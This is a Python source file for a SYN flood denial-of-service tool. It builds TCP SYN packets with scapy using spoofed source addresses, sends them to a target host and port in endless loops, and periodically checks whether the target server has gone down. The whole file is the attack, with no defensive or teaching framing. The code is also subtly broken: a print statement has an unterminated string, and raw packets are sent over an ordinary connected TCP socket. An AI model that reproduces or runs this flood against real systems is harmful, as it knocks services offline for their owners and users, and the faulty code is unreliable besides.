#!/usr/bin/env python

def sendpacket(Ip_range, destinationnew, targetport, destination):
    from scapy.all import IP, TCP
    from checkserversdown_synflood import *
    import random
    import socket
    silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    silva.connect((destinationnew, targetport))
    number = 1
    cnt = 1
    if type(Ip_range) != list:
        while 0 == 0:
             try:
                 silva.send(bytes(IP(dst = str(destinationnew), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
                 print str(cnt) + ' packages sent!; 
                 if cnt == 1:
                    cntcheck = random.randint(1000, 2000)
                    cnt = cnt + 1
                 else:
                    if cnt == cntcheck:
                       if 'h' in destination:
                           checkserversdown(destination)
                           cnt = 1
                      
             
                 
             except:
                 silva.close()
                 silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 silva.connect((destinationnew, targetport))
        
    else: 
       while 0 == 0:
           try:
               sourceIP = random.choice(Ip_range)
               silva.send(bytes(IP(dst = str(destinationnew), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
               Ip_range.remove(sourceIP)
               print 'package sent'
           except:         
               silva.close()
               silva = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
               silva.connect((destinationnew, targetport))
